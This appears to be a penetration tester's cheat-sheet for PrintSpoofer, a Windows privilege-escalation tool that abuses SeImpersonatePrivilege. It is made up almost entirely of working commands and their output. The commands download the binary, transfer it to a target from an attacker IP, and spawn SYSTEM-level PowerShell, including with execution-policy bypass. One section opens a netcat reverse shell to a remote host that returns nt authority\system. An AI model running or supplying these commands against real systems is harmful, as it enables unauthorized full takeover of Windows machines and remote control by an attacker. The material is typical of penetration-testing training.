
https://github.com/itm4n/PrintSpoofer
## Elevated powershell if you have SeImpersonatePrivilege
Downloading it
```
┌──(kali㉿kali)-[~/tools/printspoofer]
└─$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 
┌──(kali㉿kali)-[~/tools/printspoofer]
└─$ chmod +x PrintSpoofer64.exe  
┌──(kali㉿kali)-[~/tools/printspoofer]
└─$ ls -lh
total 28K
-rwxrwxr-x 1 kali kali 27K Dec  7  2021 PrintSpoofer64.exe
```

Getting printspoofer
```
iwr -uri http://192.168.45.175/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
```

Run it and open powershell

```
.\PrintSpoofer64.exe -i -c powershell.exe
```


## reverse shell with nc
```
C:\TOOLS>PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

Netcat listener:
```
C:\TOOLS>nc.exe -l -p 1337
Microsoft Windows [Version 10.0.19613.1000]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```

## Usage 3: Spawn a SYSTEM process on a desktop

If you are logged on locally or via RDP (including VDI), you can spawn a SYSTEM command prompt on your desktop. First, check your session ID with the command qwinsta and then specify this value with the option -d.
Use case: Terminal Session (RDP), VDI
```
C:\TOOLS>qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
 console           Administrator             1  Active
>rdp-tcp#3         lab-user                  3  Active
 rdp-tcp                                 65536  Listen

C:\TOOLS>PrintSpoofer.exe -d 3 -c "powershell -ep bypass"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```
